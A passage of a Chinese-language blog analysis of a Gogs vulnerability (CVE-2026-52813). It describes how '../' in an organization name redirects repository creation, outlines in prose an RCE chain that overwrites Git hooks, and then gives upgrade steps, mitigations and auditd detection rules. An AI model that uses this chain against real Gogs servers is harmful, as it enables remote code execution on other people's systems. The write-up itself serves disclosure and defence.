+<p>函数调用 <code>os.MkdirAll()</code> 创建组织目录，并通过 <code>UserPath(org.Name)</code> 生成目标路径。跟入 <code>UserPath</code> 后可以看到，组织名称仅转为小写，随后直接参与路径拼接。</p>
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260629111004631.png" alt="Gogs 漏洞分析截图 19" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260629111004631.png" referrerpolicy="no-referrer">
+
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260629111224900.png" alt="Gogs 漏洞分析截图 20" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260629111224900.png" referrerpolicy="no-referrer">
+
+<p>项目在 <code>internal/pathutil/pathutil.go</code> 中已经存在用于阻止路径越界的辅助函数，但该组织创建调用链没有使用它。</p>
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260629112352680.png" alt="Gogs 漏洞分析截图 21" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260629112352680.png" referrerpolicy="no-referrer">
+
+<p>最终，攻击者可以通过组织名称中的 <code>../</code> 序列改变仓库目录落点，再结合 Git 工作树同步和 Hook 覆盖完成 RCE 利用链。</p>
+<h3 id="section-6-2-rce-的实现-25">6.2 RCE 的实现</h3>
+<p>RCE 阶段与路径遍历阶段所需权限一致：攻击者只需要一个 Gogs 普通用户账号。</p>
+<p>Gogs 创建仓库时会在磁盘上生成 Git 裸仓库，并写入 <code>hooks/update</code> 等包装脚本。例如，正常的 <code>hooks/update</code> 会调用 <code>/app/gogs/gogs hook update</code>。当仓库发生特定 Git 操作时，这些 Hook 会由 Git 自动触发。</p>
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260630161819871.png" alt="Gogs 漏洞分析截图 22" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260630161819871.png" referrerpolicy="no-referrer">
+
+<p>攻击链可以概括为三个阶段：</p>
+<ol>
+<li><strong>路径错位：</strong> 创建组织时在名称中插入路径遍历序列，Gogs 解析后将组织仓库创建到外层仓库的工作树 <code>/data/gogs/data/tmp/local-r/&lt;repo-id&gt;/nessted/</code> 中，而不是预期的仓库存储目录。</li>
+<li><strong>覆盖 Hook：</strong> 攻击者克隆外层 Writer 仓库，在嵌套仓库的 <code>hooks/update</code> 中写入测试命令并推送；随后触发 <code>git reset --hard</code>，让工作树中的恶意 Hook 覆盖 Gogs 原有包装器。</li>
+<li><strong>触发执行：</strong> 攻击者通过 API 操作嵌套仓库，引发 Git 操作并触发已被覆盖的 <code>hooks/update</code>。命令以 <code>git</code> 用户身份执行，结果再通过 Writer 仓库的 Raw 端点读取。</li>
+</ol>
+<h2 id="section-7-修复建议-26">7. 修复建议</h2>
+<h3 id="section-7-1-版本自查-27">7.1 版本自查</h3>
+<pre><code class="language-bash">docker exec cve-2026-52813-target /app/gogs/gogs --version
+</code></pre>
+<img loading="lazy" decoding="async" src="https://gitee.com/hongzh0/picrrrrasaasaszxxzxz/raw/master/20260626214405007.png" alt="Gogs 漏洞分析截图 23" data-fallback-src="/assets/posts/gogs-organization-name-path-traversal-rce/20260626214405007.png" referrerpolicy="no-referrer">
+
+<h3 id="section-7-2-gogs-升级-28">7.2 Gogs 升级</h3>
+<pre><code class="language-bash"># 下载最新版本
+wget https://github.com/gogs/gogs/releases/download/v0.14.3/gogs_v0.14.3_linux_amd64.tar.gz
+
+# 解压
+tar -xzf gogs_v0.14.3_linux_amd64.tar.gz
+
+# 停止服务后替换
+systemctl stop gogs
+cp gogs /path/to/gogs/gogs
+
+# 重启服务
+systemctl start gogs
+</code></pre>
+<h3 id="section-7-3-临时缓解措施-29">7.3 临时缓解措施</h3>
+<h4 id="section-7-3-1-禁用用户自助注册-30">7.3.1 禁用用户自助注册</h4>
+<p>编辑 Gogs 配置文件 custom/conf/app.ini，在 [auth] 段中禁用自助注册，阻止攻击者创建新账户：</p>
+<pre><code class="language-ini">[auth]
+DISABLE_REGISTRATION = true
+</code></pre>
+<p>修改后重启 Gogs 服务使配置生效：</p>
+<pre><code class="language-bash">systemctl restart gogs
+
+# Docker 部署
+docker restart gogs
+</code></pre>
+<p>注意：此措施不能防御已注册的恶意用户，且不影响管理员手动创建用户。</p>
+<h4 id="section-7-3-2-以受限用户运行-gogs-进程-31">7.3.2 以受限用户运行 Gogs 进程</h4>
+<p>将 Gogs 服务运行的 git 用户限制在最小权限下，减小 RCE 后的影响范围：</p>
+<p>创建受限的 Gogs 用户：</p>
+<pre><code class="language-bash">useradd -r -s /bin/false -d /data/gogs gogs
+</code></pre>
+<p>移除不必要的 sudo 权限</p>
+<p>确保 <code>/etc/sudoers</code> 中没有 git 用户的 NOPASSWD 条目</p>
+<p>限制 git 用户的 SSH 访问</p>
+<p>在 <code>/home/git/.ssh/authorized_keys</code> 中添加 <code>command=</code> 限制</p>
+<p>或在 Docker 中以非 root 用户运行</p>
+<pre><code class="language-bash">docker run -d --name=gogs -p 3000:3000 \
+ --user 1000:1000 \
+ -v /data/gogs:/data \
+ gogs/gogs:0.14.3
+</code></pre>
+<h4 id="section-7-3-3-文件系统监控与利用痕迹检测-32">7.3.3 文件系统监控与利用痕迹检测</h4>
+<p>部署 auditd 规则监控 Gogs 数据目录之外的异常 Git 仓库写入：</p>
+<pre><code class="language-bash"># 监控工作树目录中非预期的 Hook 写入
+auditctl -w /data/gogs/data/tmp/local-r/ -p wa -k gogs_hooks_write
+
+# 监控 /tmp 下由 git 用户创建的文件
+auditctl -w /tmp/ -p wa -k gogs_rce_indicator -F uid=$(id -u git)
+
+# 查询审计日志
+ausearch -k gogs_hooks_write --start recent
+ausearch -k gogs_rce_indicator --start recent
+</code></pre>
+<hr>
+<blockquote>
+<p><strong>再次强调：</strong> 临时缓解措施无法保证对所有攻击向量的防护，<strong>尽快升级</strong>是唯一的彻底解决方案。</p>
+</blockquote>
+<h2 id="section-8-参考链接-33">8. 参考链接</h2>
+<ol>
+<li><a href="https://github.com/advisories/GHSA-c39w-43gm-34h5">GitHub Advisory：GHSA-c39w-43gm-34h5</a></li>
+<li><a href="https://github.com/gogs/gogs/commit/f6acd467305943aae8403cbac81f0118dd1235d7">Gogs 修复提交</a></li>
+<li><a href="https://github.com/gogs/gogs/releases/tag/v0.14.3">Gogs v0.14.3 Release</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-52813">NVD：CVE-2026-52813</a></li>
+<li><a href="https://vuldb.com/cve/CVE-2026-52813">VulDB：CVE-2026-52813</a></li>
+<li><a href="https://www.miggo.io/vulnerability-database/cve/CVE-2026-52813">Miggo 漏洞数据库</a></li>
+<li><a href="https://advisories.gitlab.com/golang/gogs.io/gogs/CVE-2026-52813/">GitLab Advisory Database</a></li>
+<li><a href="https://gist.github.com/JorianWoltjer/4b72063338b27140f4439c524d98f2b9">公开 PoC Gist</a></li>
+<li><a href="https://www.secrss.com/articles/91633">安全客文章转载索引</a></li>
+<li><a href="https://www.gm7.org/archives/117672">GM7 相关文章</a></li>
+<li><a href="https://secalerts.co/vulnerability/CVE-2026-52813">SecAlerts：CVE-2026-52813</a></li>
+</ol>
+<footer class="article-end"><span>END OF RESEARCH NOTE</span><p>最后更新于 2026.07.04 · hongzh0's Blog</p></footer><nav class="article-nav" aria-label="文章导航"><a class="article-nav-prev" rel="prev" href="xstream-vulnerability-analysis-collection.html" aria-label="上一篇：XStream 漏洞分析合集：从反序列化 RCE 到二进制流 DoS"><span>上一篇</span><strong>XStream 漏洞分析合集：从反序列化 RCE 到二进制流 DoS</strong></a><a class="article-nav-next" rel="next" href="rabbitmq-management-unc-ssrf.html" aria-label="下一篇：RabbitMQ 管理插件绝对路径遍历导致 UNC SSRF（CVE-2026-57211）"><span>下一篇</span><strong>RabbitMQ 管理插件绝对路径遍历导致 UNC SSRF（CVE-2026-57211）</strong></a></nav></article></div></main>
+<footer class="site-footer"><div class="wrap footer-grid"><div><a class="brand footer-brand" href="../index.html"><img class="brand-avatar" src="/assets/avatar-72.webp" srcset="/assets/avatar-72.webp 72w, /assets/avatar-128.webp 128w" sizes="36px" alt="" width="36" height="36" decoding="async"><span>hongzh0's Blog</span></a><p>安全研究、Agent应用、工具开发。</p></div><div class="footer-links"><span>探索</span><a href="../archive.html">文章归档</a><a href="../links.html">友链</a><a href="../about.html">关于我</a><a href="../feed.xml">RSS 订阅</a></div><div class="footer-links"><span>连接</span><a href="https://github.com/hg0434hongzh0" target="_blank" rel="noreferrer">GitHub <span aria-hidden="true">↗</span></a></div><div class="footer-end"><span>© 2026 HONGZH0</span><span class="site-stats" aria-label="站点访问统计"><span>PV <strong id="busuanzi_site_pv">—</strong></span><span>UV <strong id="busuanzi_site_uv">—</strong></span></span><button type="button" class="back-top" aria-label="返回顶部"><span aria-hidden="true">↑</span></button></div></div></footer><script src="../assets/main.js?v=e669a6bd36ee"></script></body></html>
